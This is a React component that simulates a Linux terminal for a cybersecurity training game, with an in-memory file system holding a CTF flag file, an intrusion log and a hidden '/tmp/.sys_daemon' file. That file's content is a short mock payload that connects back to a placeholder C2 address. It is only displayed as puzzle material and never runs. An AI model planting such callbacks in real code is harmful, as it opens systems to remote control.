import React, { useState, useRef, useEffect } from 'react';
import { Terminal as TerminalIcon, Play, RefreshCw, HelpCircle, ChevronRight } from 'lucide-react';

interface FileNode {
  name: string;
  type: 'file' | 'dir';
  content?: string;
  children?: { [key: string]: FileNode };
}

interface TerminalLine {
  text: string;
  type: 'input' | 'output' | 'error' | 'success' | 'system';
  dir?: string;
}

const initialFileSystem: FileNode = {
  name: '/',
  type: 'dir',
  children: {
    home: {
      name: 'home',
      type: 'dir',
      children: {
        student: {
          name: 'student',
          type: 'dir',
          children: {
            'welcome.txt': {
              name: 'welcome.txt',
              type: 'file',
              content: '=== WELCOME TO CYBERVERSE TERMINAL ===\nUse commands to navigate and inspect the system.\nType "help" to list available commands.'
            },
            'passwords.txt': {
              name: 'passwords.txt',
              type: 'file',
              content: 'admin:FLAG{SECURE_YOUR_TERMINAL_0019}\noperator:OpSecure102!'
            },
            projects: {
              name: 'projects',
              type: 'dir',
              children: {
                'analyzer.py': {
                  name: 'analyzer.py',
                  type: 'file',
                  content: 'import socket\nimport os\n\ndef scan(host, port):\n    print(f"Scanning {host}:{port}")'
                }
              }
            }
          }
        }
      }
    },
    var: {
      name: 'var',
      type: 'dir',
      children: {
        log: {
          name: 'log',
          type: 'dir',
          children: {
            syslog: {
              name: 'syslog',
              type: 'file',
              content: 'Jul 20 06:12:01 kernel: SafeBoot initiated.\nJul 20 06:15:10 alerts: [ALERT] Intrusive probe identified on port 22 from 185.190.140.54\nJul 20 06:15:30 active_incident: [CRITICAL] Process "/tmp/.sys_daemon" spawned. Hash: c8a3df7a881881ef4'
            }
          }
        }
      }
    },
    tmp: {
      name: 'tmp',
      type: 'dir',
      children: {
        '.sys_daemon': {
          name: '.sys_daemon',
          type: 'file',
          content: '# EXPLOIT PAYLOAD\nimport urllib.request\n# Connect back to C2 server\nurllib.request.urlopen("http://198.51.100.8:6667")'
        }
      }
    }
  }
};

export default function TerminalSimulator() {
  const [fs, setFs] = useState<FileNode>(initialFileSystem);
  const [currentPath, setCurrentPath] = useState<string[]>(['home', 'student']);
  const [input, setInput] = useState<string>('');
  const [lines, setLines] = useState<TerminalLine[]>([
    { text: 'CyberVerse Virtual Shell v1.4.2 (Linux x86_64)', type: 'system' },
    { text: 'Type "help" for a list of available instructions.', type: 'output' },
    { text: '', type: 'output' }
  ]);
  const [history, setHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState<number>(-1);

  const containerRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (containerRef.current) {
      containerRef.current.scrollTop = containerRef.current.scrollHeight;
    }
  }, [lines]);

  const handleContainerClick = () => {
    if (inputRef.current) {
      inputRef.current.focus();
    }
  };

  // Helper to find node in filesystem
  const getNodeByPath = (pathArray: string[]): FileNode | null => {
    let current: FileNode = fs;
    for (const segment of pathArray) {
      if (segment === '' || segment === '.') continue;
      if (current.type !== 'dir' || !current.children) return null;
      if (segment in current.children) {
        current = current.children[segment];
      } else {
        return null;
      }
    }
    return current;
  };

  const getPathString = (pathArr: string[]): string => {
    return '/' + pathArr.join('/');
  };

  const executeCommand = (commandLine: string) => {
    const trimmed = commandLine.trim();
    if (!trimmed) return;

    setHistory((prev) => [...prev, trimmed]);
    setHistoryIndex(-1);

    const fullPrompt = `${getPathString(currentPath)}$ `;
    setLines((prev) => [...prev, { text: `${fullPrompt}${trimmed}`, type: 'input', dir: getPathString(currentPath) }]);

    const parts = trimmed.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);

    switch (cmd) {
      case 'clear':
        setLines([]);
        break;

      case 'help':
        setLines((prev) => [
          ...prev,
          { text: 'Available commands:', type: 'output' },
          { text: '  pwd          - Print current working directory', type: 'output' },
          { text: '  ls [path]    - List files and subfolders', type: 'output' },
          { text: '  cd <dir>     - Change active directory (supports cd .., cd /, cd ~)', type: 'output' },
          { text: '  cat <file>   - Output contents of a file', type: 'output' },
          { text: '  mkdir <name> - Create a new subfolder in the current directory', type: 'output' },
          { text: '  touch <name> - Create an empty text file', type: 'output' },
          { text: '  tree         - Recursively display structural directory hierarchy', type: 'output' },
          { text: '  whoami       - Display current active user identity', type: 'output' },
          { text: '  history      - List previous commands', type: 'output' },
          { text: '  clear        - Clear console window', type: 'output' },
          { text: '  man <cmd>    - Display command reference guide', type: 'output' }
        ]);
        break;

      case 'pwd':
        setLines((prev) => [...prev, { text: getPathString(currentPath), type: 'output' }]);
        break;

      case 'whoami':
        setLines((prev) => [...prev, { text: 'student@cyberverse', type: 'output' }]);
        break;

      case 'ls': {
        let targetPath = [...currentPath];
        if (args.length > 0) {
          const customPath = args[0];
          if (customPath.startsWith('/')) {
            targetPath = customPath.split('/').filter(Boolean);
          } else {
            const segments = customPath.split('/');
            for (const seg of segments) {
              if (seg === '..') {
                targetPath.pop();
              } else if (seg !== '.') {
                targetPath.push(seg);
              }
            }
          }
        }

        const node = getNodeByPath(targetPath);
        if (!node) {
          setLines((prev) => [...prev, { text: `ls: cannot access '${args[0]}': No such file or directory`, type: 'error' }]);
        } else if (node.type === 'file') {
          setLines((prev) => [...prev, { text: node.name, type: 'output' }]);
        } else {
          const contents = node.children ? Object.values(node.children) : [];
          if (contents.length === 0) {
            setLines((prev) => [...prev, { text: '(empty directory)', type: 'system' }]);
          } else {
            const formatted = contents
              .map((item) => (item.type === 'dir' ? `[DIR] ${item.name}/` : `      ${item.name}`))
              .join('\n');
            setLines((prev) => [...prev, { text: formatted, type: 'output' }]);
          }
        }
        break;
      }

      case 'cd': {
        const targetDir = args[0] || '~';
        if (targetDir === '~' || targetDir === '/home/student') {
          setCurrentPath(['home', 'student']);
          break;
        }
        if (targetDir === '/') {
          setCurrentPath([]);
          break;
        }

        const segments = targetDir.split('/');
        let newPath = [...currentPath];

        for (const seg of segments) {
          if (!seg || seg === '.') continue;
          if (seg === '..') {
            newPath.pop();
          } else {
            newPath.push(seg);
          }
        }

        const node = getNodeByPath(newPath);
        if (!node) {
          setLines((prev) => [...prev, { text: `cd: no such directory: ${targetDir}`, type: 'error' }]);
        } else if (node.type !== 'dir') {
          setLines((prev) => [...prev, { text: `cd: not a directory: ${targetDir}`, type: 'error' }]);
        } else {
          setCurrentPath(newPath);
        }
        break;
      }

      case 'cat': {
        if (args.length === 0) {
          setLines((prev) => [...prev, { text: 'cat: missing file operand', type: 'error' }]);
          break;
        }
        const fileName = args[0];
        const targetPath = fileName.startsWith('/')
          ? fileName.split('/').filter(Boolean)
          : [...currentPath, ...fileName.split('/')];

        const node = getNodeByPath(targetPath);
        if (!node) {
          setLines((prev) => [...prev, { text: `cat: ${fileName}: No such file or directory`, type: 'error' }]);
        } else if (node.type === 'dir') {
          setLines((prev) => [...prev, { text: `cat: ${fileName}: Is a directory`, type: 'error' }]);
        } else {
          setLines((prev) => [...prev, { text: node.content || '(empty)', type: 'output' }]);
        }
        break;
      }

      case 'mkdir': {
        if (args.length === 0) {
          setLines((prev) => [...prev, { text: 'mkdir: missing folder operand', type: 'error' }]);
          break;
        }
        const newFolderName = args[0];
        const parentNode = getNodeByPath(currentPath);

        if (parentNode && parentNode.children) {
          if (newFolderName in parentNode.children) {
            setLines((prev) => [...prev, { text: `mkdir: cannot create directory '${newFolderName}': File exists`, type: 'error' }]);
          } else {
            const updatedFs = { ...fs };
            let curr: FileNode = updatedFs;
            for (const seg of currentPath) {
              if (curr.children) curr = curr.children[seg];
            }
            if (curr.children) {
              curr.children[newFolderName] = {
                name: newFolderName,
                type: 'dir',
                children: {}
              };
            }
            setFs(updatedFs);
            setLines((prev) => [...prev, { text: `Created directory: ${newFolderName}`, type: 'success' }]);
          }
        }
        break;
      }

      case 'touch': {
        if (args.length === 0) {
          setLines((prev) => [...prev, { text: 'touch: missing file operand', type: 'error' }]);
          break;
        }
        const newFileName = args[0];
        const parentNode = getNodeByPath(currentPath);

        if (parentNode && parentNode.children) {
          if (newFileName in parentNode.children) {
            setLines((prev) => [...prev, { text: `touch: updated timestamp for ${newFileName}`, type: 'success' }]);
          } else {
            const updatedFs = { ...fs };
            let curr: FileNode = updatedFs;
            for (const seg of currentPath) {
              if (curr.children) curr = curr.children[seg];
            }
            if (curr.children) {
              curr.children[newFileName] = {
                name: newFileName,
                type: 'file',
                content: ''
              };
            }
            setFs(updatedFs);
            setLines((prev) => [...prev, { text: `Created file: ${newFileName}`, type: 'success' }]);
          }
        }
        break;
      }

      case 'tree': {
        const rootNode = getNodeByPath(currentPath);
        if (!rootNode) {
          setLines((prev) => [...prev, { text: 'tree: directory error', type: 'error' }]);
          break;
        }
        const buildTreeString = (node: FileNode, depth: string = ''): string => {
          let str = '';
          const contents = node.children ? Object.values(node.children) : [];
          contents.forEach((child, index) => {
            const isLast = index === contents.length - 1;
            const marker = isLast ? '└── ' : '├── ';
            str += `${depth}${marker}${child.name}${child.type === 'dir' ? '/' : ''}\n`;
            if (child.type === 'dir') {
              const childDepth = depth + (isLast ? '    ' : '│   ');
              str += buildTreeString(child, childDepth);
            }
          });
          return str;
        };
        const treeStr = `.\n${buildTreeString(rootNode)}`;
        setLines((prev) => [...prev, { text: treeStr, type: 'output' }]);
        break;
      }

      case 'history':
        setLines((prev) => [
          ...prev,
          { text: history.map((h, i) => `${i + 1}  ${h}`).join('\n'), type: 'output' }
        ]);
        break;

      case 'man': {
        if (args.length === 0) {
          setLines((prev) => [...prev, { text: 'What manual page do you want? Try "man ls" or "man chmod"', type: 'error' }]);
          break;
        }
        const lookup = args[0].toLowerCase();
        let manPage = '';
        if (lookup === 'ls') {
          manPage = 'LS(1) - List directory contents.\n\nUSAGE:\n  ls [options] [path]\n\nDESCRIPTION:\n  Lists information about the files and directories inside the target path.';
        } else if (lookup === 'cd') {
          manPage = 'CD(1) - Change the working directory.\n\nUSAGE:\n  cd [path]\n\nDESCRIPTION:\n  Moves your active shell session into the specified path. Support "cd .." to go up.';
        } else if (lookup === 'cat') {
          manPage = 'CAT(1) - Concatenate files and print on the standard output.\n\nUSAGE:\n  cat <file_name>\n\nDESCRIPTION:\n  Reads the file content and outputs it directly onto the screen.';
        } else {
          manPage = `No manual entry for: ${lookup}`;
        }
        setLines((prev) => [...prev, { text: manPage, type: 'output' }]);
        break;
      }

      default:
        setLines((prev) => [
          ...prev,
          { text: `bash: ${cmd}: command not found. Type "help" for instructions.`, type: 'error' }
        ]);
        break;
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      executeCommand(input);
      setInput('');
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (history.length > 0) {
        const nextIndex = historyIndex + 1;
        if (nextIndex < history.length) {
          setHistoryIndex(nextIndex);
          setInput(history[history.length - 1 - nextIndex]);
        }
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      const nextIndex = historyIndex - 1;
      if (nextIndex >= 0) {
        setHistoryIndex(nextIndex);
        setInput(history[history.length - 1 - nextIndex]);
      } else {
        setHistoryIndex(-1);
        setInput('');
      }
    }
  };

  const resetTerminal = () => {
    setFs(JSON.parse(JSON.stringify(initialFileSystem)));
    setCurrentPath(['home', 'student']);
    setLines([
      { text: 'Virtual Linux Environment re-initialized successfully.', type: 'success' },
      { text: 'Current directory set to: /home/student', type: 'output' }
    ]);
  };

  return (
    <div id="terminal-sim-container" className="flex flex-col bg-slate-950/90 border border-emerald-500/30 rounded-xl overflow-hidden font-mono text-sm text-emerald-400 shadow-2xl h-[500px]">
      {/* Terminal Title Bar */}
      <div className="flex items-center justify-between px-4 py-2 bg-slate-900 border-b border-emerald-500/20">
        <div className="flex items-center gap-2">
          <TerminalIcon className="w-4 h-4 text-emerald-500 animate-pulse" />
          <span className="text-xs font-semibold text-emerald-300">virtual-shell@student: ~</span>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={resetTerminal}
            className="p-1 hover:bg-slate-800 rounded text-emerald-400 hover:text-emerald-300 transition-colors"
            title="Reset Filesystem"
          >
            <RefreshCw className="w-3.5 h-3.5" />
          </button>
          <div className="flex gap-1.5 ml-2">
            <span className="w-2.5 h-2.5 rounded-full bg-red-500/75"></span>
            <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/75"></span>
            <span className="w-2.5 h-2.5 rounded-full bg-green-500/75"></span>
          </div>
        </div>
      </div>

      {/* Terminal Console Output Body */}
      <div
        ref={containerRef}
        onClick={handleContainerClick}
        className="flex-1 p-4 overflow-y-auto space-y-1.5 selection:bg-emerald-500/30 selection:text-emerald-100 cursor-text scrollbar-thin scrollbar-thumb-emerald-500/20"
      >
        {lines.map((line, idx) => (
          <div key={idx} className="whitespace-pre-wrap leading-relaxed break-all">
            {line.type === 'input' ? (
              <div className="flex items-start gap-1">
                <span className="text-cyan-400 font-bold shrink-0">{line.dir}$</span>
                <span className="text-white font-medium">{line.text.slice(line.dir ? line.dir.length + 2 : 0)}</span>
              </div>
            ) : line.type === 'error' ? (
              <span className="text-rose-500">❌ {line.text}</span>
            ) : line.type === 'success' ? (
              <span className="text-teal-400">✔ {line.text}</span>
            ) : line.type === 'system' ? (
              <span className="text-cyan-300 font-semibold">{line.text}</span>
            ) : (
              <span className="text-emerald-300">{line.text}</span>
            )}
          </div>
        ))}

        {/* Prompt Input Line */}
        <div className="flex items-center gap-1.5 pt-1.5">
          <span className="text-cyan-400 font-bold shrink-0">{getPathString(currentPath)}$</span>
          <input
            ref={inputRef}
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={handleKeyDown}
            className="flex-1 bg-transparent border-none outline-none text-white font-medium focus:ring-0 p-0"
            autoFocus
            autoComplete="off"
            spellCheck={false}
          />
        </div>
      </div>

      {/* Bottom status helper bar */}
      <div className="px-4 py-1.5 bg-slate-900 border-t border-emerald-500/10 text-[11px] text-emerald-500/60 flex justify-between">
        <div className="flex items-center gap-1">
          <HelpCircle className="w-3 h-3" />
          <span>Type <b>help</b> for command manual list.</span>
        </div>
        <span>Session: student@cyberverse-container</span>
      </div>
    </div>
  );
}
